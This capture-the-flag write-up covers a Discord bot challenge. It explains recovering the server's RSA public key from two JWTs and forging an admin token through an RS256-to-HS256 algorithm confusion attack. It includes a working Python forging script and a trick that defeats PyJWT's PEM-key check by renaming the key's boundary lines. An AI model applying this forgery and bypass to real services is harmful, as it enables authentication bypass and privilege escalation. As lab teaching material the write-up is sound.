# [**Writeup**](#)

The challenge involves a Discord bot that provides two commands:
- `/start_adventure` registers a user and issues a JWT token.
![](../img/start_adventure.png)

- `/join_adventure` validates the user by decoding the provided JWT token using the specified algorithm.
![](../img/join_adventure.png)

The token's payload includes a public key (`pk`) that is used for decoding and is set to the server's public key if not provided. To solve the challenge, we exploit the `CVE-2017-11424` vulnerability to retrieve the server's public key using two JWT tokens and utilize the standalone tool in [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) to generate the public key.

After generating the public key, we can use it to forge a JWT token with a payload containing the user type `master` and a sufficiently extended expiration time. We will also perform an algorithm confusion attack by altering the algorithm from **RS256** (asymmetric) to **HS256** (symmetric):

```python
from datetime import datetime, timedelta

import jwt

token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDc1MjcyMDU1NDk1ODUyMDUyLCJ1c2VybmFtZSI6ImQ0cnFzMWQzciIsInR5cGUiOiJhZHZlbnR1cmVyIiwiZXhwIjoxNzM0MTg4NTY5fQ.R6LwROf1vsduxakLxuO-fZcJKJjJNuiPNO7GLmFTaHxTAvk4r5asiAbTPwKDyuXgkVvU4N1-X1aL2NxETWBRAnV21XPUKFz1IFOiDTJmzrpNJsLLg8nI59OfYHAQePtly1SHZb8TFfrBFH5n9IVS_ULAy_VT0U7BiNNzUklHrhkuABw_PRqslGQGpdEeEiHnclPT4VUa0NmXjKcmdKvJHNO5vADeGnS95pCI8A5l2U1nHclaVe1KP_pI8Ix5pvTvZbmzosTM76Ybl81AAGMGCIobCa5juLaMmHtJcOk99t5J3CzzvMIHTLJ47k-MrlvnhVhQEeAK4SCcT7R7PUfpIg'

pk = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtfIWWGrtI6tUgigUxEAI
3KaraM2m8DcywnyuZxGaIumtE4MNekO0R35Q2bM2ZOAXU2E6he0S4SdItpArXLo+
QGetfTxvJ79/ypFs2Kjmh0m6EmgglNPurjhhtj2s534kcwBTJE1uv8DnWERMLyuD
ov8PzCnql78zuGh0N4dI3p1Q2Sb9EkAFvmndK9xTWcx87gfdJCdqPR09EUVuLx28
YHdu0DdXOiP/c0abCUwqHxKcAi5PqA8oRSm5uC/I4+flzkN9ciPglrHYwQSFOq0s
1sDZe3b0MeGujDf70LDk08HsLaPMCapcRIBFYs7H0H84hZeAN2cOw8x7iY50L3xZ
OwIDAQAB
-----END PUBLIC KEY-----
'''

header = jwt.get_unverified_header(token)
algorithm = header.get('alg', 'RS256')
payload = jwt.decode(token, options={"verify_signature": False})

payload['type'] = 'master'
payload['pk'] = pk
payload['exp'] = datetime.now() + timedelta(days=30)

token = jwt.encode(
    payload=payload,
    key=payload['pk'],
    algorithm='HS256'
)

print(token)
```

However, the challenge is complicated by the PyJWT package, which raises an error when attempting to use a public key for symmetric encryption.

```sh
Traceback (most recent call last):
  File "Cyber-Odyssey-Finals-2024/misc/FlagSideQuest/solve.py", line 25, in <module>
    token = jwt.encode(
        payload=payload,
        key=payload['pk'],
        algorithm='HS256'
    )
  File "/opt/homebrew/lib/python3.13/site-packages/jwt/api_jwt.py", line 78, in encode
    return api_jws.encode(
           ~~~~~~~~~~~~~~^
        json_payload,
        ^^^^^^^^^^^^^
    ...<4 lines>...
        sort_headers=sort_headers,
        ^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File "/opt/homebrew/lib/python3.13/site-packages/jwt/api_jws.py", line 170, in encode
    key = alg_obj.prepare_key(key)
  File "/opt/homebrew/lib/python3.13/site-packages/jwt/algorithms.py", line 259, in prepare_key
    raise InvalidKeyError(
    ...<2 lines>...
    )
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```

To circumvent this issue, we analyze the source code of the [.encode()](https://github.com/jpadilla/pyjwt/blob/565b6d95d65d8d210de5fad50e177cbd814a56de/jwt/api_jwt.py#L49) and [.decode()](https://github.com/jpadilla/pyjwt/blob/565b6d95d65d8d210de5fad50e177cbd814a56de/jwt/api_jwt.py#L195) methods in the [PyJWT](https://github.com/jpadilla/pyjwt/tree/master) package, particularly in [algorithms.py](https://github.com/jpadilla/pyjwt/blob/master/jwt/algorithms.py) and [utils.py](https://github.com/jpadilla/pyjwt/blob/master/jwt/utils.py).

In [utils.py](https://github.com/jpadilla/pyjwt/blob/565b6d95d65d8d210de5fad50e177cbd814a56de/jwt/utils.py#L97-L127), we find the function that checks if the key is in PEM format:

```python
_PEMS = {
    b"CERTIFICATE",
    b"TRUSTED CERTIFICATE",
    b"PRIVATE KEY",
    b"PUBLIC KEY",
    b"ENCRYPTED PRIVATE KEY",
    b"OPENSSH PRIVATE KEY",
    b"DSA PRIVATE KEY",
    b"RSA PRIVATE KEY",
    b"RSA PUBLIC KEY",
    b"EC PRIVATE KEY",
    b"DH PARAMETERS",
    b"NEW CERTIFICATE REQUEST",
    b"CERTIFICATE REQUEST",
    b"SSH2 PUBLIC KEY",
    b"SSH2 ENCRYPTED PRIVATE KEY",
    b"X509 CRL",
}

_PEM_RE = re.compile(
    b"----[- ]BEGIN ("
    + b"|".join(_PEMS)
    + b""")[- ]----\r?
.+?\r?
----[- ]END \\1[- ]----\r?\n?""",
    re.DOTALL,
)


def is_pem_format(key: bytes) -> bool:
    return bool(_PEM_RE.search(key))
```

The function uses a regex pattern to validate the PEM format. By modifying the public key to use a different pre-boundary that is not listed in the `_PEMS`, we can make the function return `False`, thus bypassing the validation.

```
-----BEGIN hh PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtfIWWGrtI6tUgigUxEAI
3KaraM2m8DcywnyuZxGaIumtE4MNekO0R35Q2bM2ZOAXU2E6he0S4SdItpArXLo+
QGetfTxvJ79/ypFs2Kjmh0m6EmgglNPurjhhtj2s534kcwBTJE1uv8DnWERMLyuD
ov8PzCnql78zuGh0N4dI3p1Q2Sb9EkAFvmndK9xTWcx87gfdJCdqPR09EUVuLx28
YHdu0DdXOiP/c0abCUwqHxKcAi5PqA8oRSm5uC/I4+flzkN9ciPglrHYwQSFOq0s
1sDZe3b0MeGujDf70LDk08HsLaPMCapcRIBFYs7H0H84hZeAN2cOw8x7iY50L3xZ
OwIDAQAB
-----END PUBLIC KEY-----
```

However, we encounter another error related to an invalid PEM post-boundary thrown by the [RSA.import_key(pk)](bot.py#L81) function in [RSA.py](https://github.com/pycrypto/pycrypto/blob/65b43bd4ffe2a48bdedae986b1a291f5a2cc7df7/lib/Crypto/PublicKey/RSA.py#L629).

![](../img/post_boundary.png)

By tracing the error back to [PEM.py](https://github.com/pycrypto/pycrypto/blob/65b43bd4ffe2a48bdedae986b1a291f5a2cc7df7/lib/Crypto/IO/PEM.py#L96-L163), we find that the error is caused by an invalid post-boundary. We can resolve this by appending the same text used in the pre-boundary to the post-boundary.

```
-----BEGIN hh PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtfIWWGrtI6tUgigUxEAI
3KaraM2m8DcywnyuZxGaIumtE4MNekO0R35Q2bM2ZOAXU2E6he0S4SdItpArXLo+
QGetfTxvJ79/ypFs2Kjmh0m6EmgglNPurjhhtj2s534kcwBTJE1uv8DnWERMLyuD
ov8PzCnql78zuGh0N4dI3p1Q2Sb9EkAFvmndK9xTWcx87gfdJCdqPR09EUVuLx28
YHdu0DdXOiP/c0abCUwqHxKcAi5PqA8oRSm5uC/I4+flzkN9ciPglrHYwQSFOq0s
1sDZe3b0MeGujDf70LDk08HsLaPMCapcRIBFYs7H0H84hZeAN2cOw8x7iY50L3xZ
OwIDAQAB
-----END hh PUBLIC KEY-----
```

Finally, we can generate a valid JWT token using the modified public key, changing the user type to "master" in the payload and extending the expiration time, as one minute is insufficient. The payload modification can be done in the same section of the code where the token is generated. After that, we need to add the bot to our server to obtain administrator permissions using the following link:

https://discord.com/oauth2/authorize?client_id=BOT_ID&permissions=274878024704&scope=applications.commands+bot

Once completed, you will successfully obtain the flag!

![](../img/flag.png)

# [**Solution**](#)
See the [solve.py](./solve.py) for the full implementation.
